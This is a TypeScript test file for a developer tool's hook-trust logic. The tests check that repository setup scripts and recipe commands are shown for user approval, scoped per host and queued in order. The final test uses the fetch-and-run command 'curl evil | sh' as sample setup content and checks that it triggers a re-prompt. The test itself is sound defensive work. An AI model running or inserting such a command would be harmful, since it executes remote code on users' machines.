import { beforeEach, describe, expect, it, vi } from 'vitest'
import type { AppState } from '@/store/types'
import type { PersistedTrustedOrcaHooks } from '../../../shared/orca-yaml-hook-types'
import {
  __resetTrustPromptChainForTests,
  confirmCreatedWorktreeSetupContent,
  ensureHooksConfirmed,
  readAndConfirmRuntimeIssueCommand
} from './ensure-hooks-confirmed'
import { hashOrcaHookScript } from './orca-hook-trust'
import {
  createCompatibleRuntimeStatusResponseIfNeeded,
  type RuntimeEnvironmentCallRequest
} from '@/runtime/rpc/testing/runtime-compatibility-test-fixture'
import { clearRuntimeCompatibilityCache as clearRuntimeCompatibilityCacheForTests } from '@/runtime/rpc/compatibility/runtime-compatibility-cache'

const hooksCheckMock = vi.fn()
const readIssueCommandMock = vi.fn()
const runtimeEnvironmentCallMock = vi.fn()
const runtimeEnvironmentTransportCallMock = vi.fn()

function installHooksApiMock(): void {
  vi.stubGlobal('window', {
    api: {
      hooks: {
        check: hooksCheckMock,
        readIssueCommand: readIssueCommandMock
      },
      runtimeEnvironments: {
        call: runtimeEnvironmentTransportCallMock
      }
    }
  })
}

type PendingPrompt = {
  modal: string
  data: Record<string, unknown>
  resolve: (decision: 'run' | 'skip') => void
}

function createTestState(overrides?: Partial<AppState>): {
  state: AppState
  pending: PendingPrompt[]
} {
  const pending: PendingPrompt[] = []
  const trust: PersistedTrustedOrcaHooks = {}
  const state = {
    trustedOrcaHooks: trust,
    repos: [{ id: 'repo-1', displayName: 'Repo One' }],
    openModal: (modal: string, data: Record<string, unknown>) => {
      pending.push({ modal, data, resolve: data.onResolve as (d: 'run' | 'skip') => void })
    },
    ...overrides
  } as unknown as AppState
  return { state, pending }
}

describe('ensureHooksConfirmed', () => {
  beforeEach(() => {
    hooksCheckMock.mockReset()
    readIssueCommandMock.mockReset()
    runtimeEnvironmentCallMock.mockReset()
    runtimeEnvironmentTransportCallMock.mockReset()
    runtimeEnvironmentTransportCallMock.mockImplementation(
      (args: RuntimeEnvironmentCallRequest) => {
        return (
          createCompatibleRuntimeStatusResponseIfNeeded(args) ?? runtimeEnvironmentCallMock(args)
        )
      }
    )
    clearRuntimeCompatibilityCacheForTests()
    installHooksApiMock()
    __resetTrustPromptChainForTests()
  })

  it('shows the recipe extend hook and its lifetimes in the trust prompt', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: {
        environmentRecipes: [
          {
            id: 'cloud-sandbox',
            name: 'Cloud Sandbox',
            create: './scripts/start-vm.sh',
            extend: './scripts/extend-vm.sh',
            extendDurations: ['1h', '4h']
          }
        ]
      },
      mayNeedUpdate: false
    })

    const promise = ensureHooksConfirmed(state, 'repo-1', 'vmRecipe')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toContain('extend: ./scripts/extend-vm.sh')
    expect(pending[0].data.scriptContent).toContain('extendDurations: 1h, 4h')

    pending[0].resolve('run')
    await expect(promise).resolves.toBe('run')
  })

  it('shows each recipe context menu item command in the trust prompt', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: {
        environmentRecipes: [
          {
            id: 'cloud-sandbox',
            name: 'Cloud Sandbox',
            create: './scripts/start-vm.sh',
            contextMenuItems: [
              { id: 'launch-vnc', label: 'Launch VNC', command: './scripts/launch-vnc.sh' },
              { id: 'launch-rdp', label: 'Launch RDP', command: './scripts/launch-rdp.sh' }
            ]
          }
        ]
      },
      mayNeedUpdate: false
    })

    const promise = ensureHooksConfirmed(state, 'repo-1', 'vmRecipe')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    // Why the command itself: this is the only place the user can see what a click will run, and a
    // recipe that already approved a `create` must not gain one without the prompt changing.
    const content = String(pending[0].data.scriptContent)
    expect(content).toContain('contextMenuItems.launch-vnc (Launch VNC): ./scripts/launch-vnc.sh')
    expect(content).toContain('contextMenuItems.launch-rdp (Launch RDP): ./scripts/launch-rdp.sh')
    const withoutItems = await hashOrcaHookScript(content.replace(/\ncontextMenuItems\..*$/gm, ''))
    expect(pending[0].data.contentHash).not.toBe(withoutItems)

    pending[0].resolve('run')
    await expect(promise).resolves.toBe('run')
  })

  it('keeps a recipe that declares no actions on its existing trust content', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: {
        environmentRecipes: [
          { id: 'cloud-sandbox', name: 'Cloud Sandbox', create: './scripts/start-vm.sh' }
        ]
      },
      mayNeedUpdate: false
    })

    const promise = ensureHooksConfirmed(state, 'repo-1', 'vmRecipe')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    // Why exact: anything added for a recipe with no extend hook and no items would invalidate every
    // approval already stored for it.
    const expectedContent =
      '# environmentRecipes.cloud-sandbox\nname: Cloud Sandbox\ncreate: ./scripts/start-vm.sh'
    expect(pending[0].data.scriptContent).toBe(expectedContent)
    expect(pending[0].data.contentHash).toBe(await hashOrcaHookScript(expectedContent))

    pending[0].resolve('run')
    await expect(promise).resolves.toBe('run')
  })

  it('refuses to pick a host when the repo id is on two hosts and none is given', async () => {
    const { state, pending } = createTestState()
    Object.assign(state, {
      repos: [
        { id: 'repo-1', displayName: 'Runtime', executionHostId: 'runtime:env-1' },
        { id: 'repo-1', displayName: 'Local', executionHostId: 'local' }
      ]
    })

    const decision = await ensureHooksConfirmed(state, 'repo-1', 'setup')

    expect(decision).toBe('skip')
    expect(hooksCheckMock).not.toHaveBeenCalled()
    expect(runtimeEnvironmentCallMock).not.toHaveBeenCalled()
    expect(pending).toHaveLength(0)
  })

  it('approves and returns the exact issue-command bytes from one host-qualified read', async () => {
    const { state, pending } = createTestState({
      repos: [
        { id: 'repo-1', displayName: 'Local Row' },
        { id: 'repo-1', displayName: 'SSH Row', connectionId: 'server' }
      ]
    } as unknown as Partial<AppState>)
    readIssueCommandMock
      .mockResolvedValueOnce({
        status: 'ok',
        source: 'shared',
        sharedContent: 'approved bytes',
        localContent: null,
        effectiveContent: 'approved bytes',
        localFilePath: ''
      })
      .mockResolvedValueOnce({
        status: 'ok',
        source: 'shared',
        sharedContent: 'changed bytes',
        localContent: null,
        effectiveContent: 'changed bytes',
        localFilePath: ''
      })

    const promise = readAndConfirmRuntimeIssueCommand(state, 'repo-1', 'ssh:server')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('approved bytes')
    pending[0].resolve('run')

    await expect(promise).resolves.toMatchObject({
      template: 'approved bytes',
      trustDecision: 'run'
    })
    expect(readIssueCommandMock).toHaveBeenCalledTimes(1)
    expect(readIssueCommandMock).toHaveBeenCalledWith({
      repoId: 'repo-1',
      hostId: 'ssh:server',
      wakeWslDistro: true
    })
  })

  it('does not reuse repo-wide trust across duplicate execution hosts', async () => {
    const { state, pending } = createTestState({
      trustedOrcaHooks: { 'repo-1': { all: { approvedAt: 1 } } },
      repos: [
        { id: 'repo-1', displayName: 'Runtime', executionHostId: 'runtime:env-1' },
        { id: 'repo-1', displayName: 'SSH', connectionId: 'server' }
      ]
    } as unknown as Partial<AppState>)
    readIssueCommandMock.mockResolvedValue({
      status: 'ok',
      source: 'shared',
      sharedContent: 'host-specific bytes',
      localContent: null,
      effectiveContent: 'host-specific bytes',
      localFilePath: ''
    })

    const promise = readAndConfirmRuntimeIssueCommand(state, 'repo-1', 'ssh:server')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    pending[0].resolve('skip')
    await expect(promise).resolves.toMatchObject({ trustDecision: 'skip' })
  })

  it('does not open a trust prompt after its composer is cancelled mid-read', async () => {
    const { state, pending } = createTestState()
    let cancelled = false
    let resolveRead: (result: Record<string, unknown>) => void = () => undefined
    readIssueCommandMock.mockImplementation(
      () =>
        new Promise((resolve) => {
          resolveRead = resolve
        })
    )

    const promise = readAndConfirmRuntimeIssueCommand(state, 'repo-1', 'local', () => cancelled)
    cancelled = true
    resolveRead({
      status: 'ok',
      source: 'shared',
      sharedContent: 'late bytes',
      localContent: null,
      effectiveContent: 'late bytes',
      localFilePath: ''
    })

    await expect(promise).resolves.toMatchObject({ trustDecision: 'skip' })
    expect(pending).toHaveLength(0)
  })

  it('serializes overlapping prompts so a second call waits for the first to resolve', async () => {
    const { state, pending } = createTestState()
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { setup: 'pnpm install', archive: 'echo bye' } },
      mayNeedUpdate: false
    })

    const first = ensureHooksConfirmed(state, 'repo-1', 'setup')
    const second = ensureHooksConfirmed(state, 'repo-1', 'archive')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptKind).toBe('setup')

    pending[0].resolve('skip')
    await expect(first).resolves.toBe('skip')

    await vi.waitFor(() => expect(pending).toHaveLength(2))
    expect(pending[1].data.scriptKind).toBe('archive')

    pending[1].resolve('run')
    await expect(second).resolves.toBe('run')
  })

  it('lets a queued prompt for the same script see the approval recorded by the one before it', async () => {
    const created = createTestState()
    const { pending } = created
    let state = created.state
    hooksCheckMock.mockResolvedValue({
      hasHooks: true,
      hooks: { scripts: { archive: 'echo bye' } },
      mayNeedUpdate: false
    })

    const first = ensureHooksConfirmed(() => state, 'repo-1', 'archive')
    const second = ensureHooksConfirmed(() => state, 'repo-1', 'archive')

    await vi.waitFor(() => expect(pending).toHaveLength(1))
    // The store replaces its state when the dialog records trust, as zustand does.
    state = {
      ...state,
      trustedOrcaHooks: {
        'repo-1': {
          archive: { contentHash: await hashOrcaHookScript('echo bye'), approvedAt: 1 }
        }
      }
    }
    pending[0].resolve('run')

    await expect(first).resolves.toBe('run')
    await expect(second).resolves.toBe('run')
    expect(pending).toHaveLength(1)
  })

  it('re-prompts with the created branch setup content that differs', async () => {
    const { state, pending } = createTestState()

    const promise = confirmCreatedWorktreeSetupContent(() => state, 'repo-1', 'curl evil | sh')
    await vi.waitFor(() => expect(pending).toHaveLength(1))
    expect(pending[0].data.scriptContent).toBe('curl evil | sh')
    expect(pending[0].data.scriptKind).toBe('setup')
    expect(pending[0].data.skippedSetupReview).toBe('created-branch')
    pending[0].resolve('skip')

    await expect(promise).resolves.toEqual({ decision: 'skip' })
  })
})
